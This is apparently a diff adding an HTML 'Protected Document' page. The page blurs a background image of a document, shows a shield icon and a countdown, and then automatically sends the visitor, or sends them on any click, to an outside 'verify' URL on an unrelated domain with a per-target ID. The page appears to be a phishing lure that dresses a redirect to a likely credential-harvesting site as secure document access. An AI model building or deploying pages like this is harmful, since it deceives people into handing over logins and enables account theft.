@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Protected Document</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="preload" as="image" href="extracted.jpeg">
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+    }
+
+    body{
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      overflow:hidden;
+      font-family:"Segoe UI", Arial, sans-serif;
+      position:relative;
+      background:#e8f5ee;
+    }
+
+    body::before{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:url("extracted.jpeg") center center / cover no-repeat;
+      filter:blur(10px) brightness(.6);
+      transform:scale(1.08);
+      z-index:0;
+    }
+
+    body::after{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:linear-gradient(
+        135deg,
+        rgba(0,0,0,.45),
+        rgba(0,102,51,.35)
+      );
+      z-index:0;
+    }
+
+    .card{
+      position:relative;
+      z-index:1;
+      width:340px;
+      padding:35px 25px;
+      border-radius:24px;
+      backdrop-filter:blur(20px);
+      background:rgba(255,255,255,.15);
+      border:1px solid rgba(255,255,255,.2);
+      box-shadow:0 20px 40px rgba(0,0,0,.25);
+      text-align:center;
+      color:#fff;
+    }
+
+    .icon{
+      width:72px;
+      height:72px;
+      margin:auto;
+      margin-bottom:20px;
+      border-radius:50%;
+      background:rgba(255,255,255,.15);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      border:1px solid rgba(255,255,255,.25);
+    }
+
+    .icon svg{
+      width:36px;
+      height:36px;
+      fill:#4ade80;
+    }
+
+    h2{
+      font-size:24px;
+      font-weight:600;
+      margin-bottom:8px;
+    }
+
+    p{
+      font-size:14px;
+      color:rgba(255,255,255,.9);
+      line-height:1.5;
+      margin-bottom:25px;
+    }
+
+    /* =========================
+       GREEN LOADING CIRCLE
+       ========================= */
+
+    .circle{
+      width:90px;
+      height:90px;
+      margin:0 auto 22px;
+      position:relative;
+    }
+
+    .circle svg{
+      width:90px;
+      height:90px;
+      transform:rotate(-90deg);
+    }
+
+    .circle-bg{
+      fill:none;
+      stroke:rgba(255,255,255,.18);
+      stroke-width:8;
+    }
+
+    .circle-progress{
+      fill:none;
+      stroke:#22c55e;
+      stroke-width:8;
+      stroke-linecap:round;
+
+      /* Circumference of circle with r=40 */
+      stroke-dasharray:251.33;
+      stroke-dashoffset:251.33;
+
+      animation:circleLoad 3s linear forwards;
+    }
+
+    @keyframes circleLoad{
+      from{
+        stroke-dashoffset:251.33;
+      }
+
+      to{
+        stroke-dashoffset:0;
+      }
+    }
+
+    /* Countdown number */
+
+    .number{
+      position:absolute;
+      inset:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:28px;
+      font-weight:bold;
+    }
+
+    /* =========================
+       LOADING BAR
+       ========================= */
+
+    .loader{
+      width:100%;
+      height:6px;
+      border-radius:20px;
+      overflow:hidden;
+      background:rgba(255,255,255,.15);
+    }
+
+    .loader span{
+      display:block;
+      width:100%;
+      height:100%;
+      background:linear-gradient(
+        90deg,
+        #22c55e,
+        #16a34a
+      );
+
+      animation:load 3s linear forwards;
+    }
+
+    @keyframes load{
+      from{
+        width:100%;
+      }
+
+      to{
+        width:0%;
+      }
+    }
+
+    .footer{
+      margin-top:20px;
+      font-size:12px;
+      color:rgba(255,255,255,.7);
+    }
+
+    @media (max-width:400px){
+      .card{
+        width:90%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+
+    <div class="icon">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4z"/>
+      </svg>
+    </div>
+
+    <h2>Protected Document</h2>
+
+    <p>
+      Preparing your secure document.<br>
+      Please wait while we redirect you safely.
+    </p>
+
+    <!-- GREEN LOADING CIRCLE -->
+
+    <div class="circle">
+
+      <svg viewBox="0 0 90 90">
+
+        <circle
+          class="circle-bg"
+          cx="45"
+          cy="45"
+          r="40">
+        </circle>
+
+        <circle
+          id="progressCircle"
+          class="circle-progress"
+          cx="45"
+          cy="45"
+          r="40">
+        </circle>
+
+      </svg>
+
+      <div class="number" id="count">2</div>
+
+    </div>
+
+    <!-- LOADING BAR -->
+
+    <div class="loader">
+      <span></span>
+    </div>
+
+    <div class="footer">
+      Redirecting automatically..
+    </div>
+
+  </div>
+
+
+  <script>
+
+    let count = 2;
+
+    const countText = document.getElementById("count");
+
+    const interval = setInterval(() => {
+
+      count--;
+
+      if(count <= 0){
+
+        clearInterval(interval);
+
+        countText.textContent = "0";
+
+        window.location.href =
+          "https://gmtidwest.com/verify/68e408dd-9008-4635-ac48-33e2751b23a8";
+
+      }else{
+
+        countText.textContent = count;
+
+      }
+
+    }, 1500);
+
+
+    /* Redirect when user clicks anywhere */
+
+    document.body.addEventListener("click", () => {
+
+      window.location.href =
+        "https://gmtidwest.com/verify/68e408dd-9008-4635-ac48-33e2751b23a8";
+
+    });
+
+  </script>
+
+</body>
+</html>
